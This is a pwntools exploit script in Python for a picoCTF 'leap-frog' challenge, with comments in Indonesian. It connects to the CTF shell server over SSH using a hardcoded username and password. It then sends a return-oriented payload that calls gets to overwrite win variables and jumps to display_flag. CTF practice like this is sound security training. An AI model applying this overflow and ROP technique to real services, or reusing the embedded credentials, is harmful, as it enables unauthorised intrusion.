from pwn import *

def exploit():
    #p = process("./rop")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
    p = s.process("rop", cwd="/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158")

    binary = ELF("rop")
    get_flag = binary.symbols["display_flag"]
    main = binary.symbols["main"]
    plt_gets = binary.plt["gets"]
    win = binary.symbols["win1"]
    padding = 28
    
    payload = ""
    payload += "A" * padding
    payload += p32(plt_gets) # return ke gets
    payload += p32(get_flag) # stelah ret ke gets, kita akan ret ke flag
    payload += p32(win) # set address win sebagai argumen untuk gets, sehingga kita bisa overwrite variable win
                        # akan menjadi gets(&win)
                        # untuk win1, win2, win3 jarak address hanya berbeda 0x1 sehingga kita tinggal
                        # input true 3 kali
    #gdb.attach(p, """
    #            b*vuln+55
    #            c
    #            """)
    
    p.sendlineafter("> ", payload)
    payload = ""
    payload += "\x01" * 3
    p.sendline(payload) # gets ke fungsi win, mari set semua nya sebagai true(angka diatas 0)
    p.interactive()

if __name__ == "__main__":
    exploit()
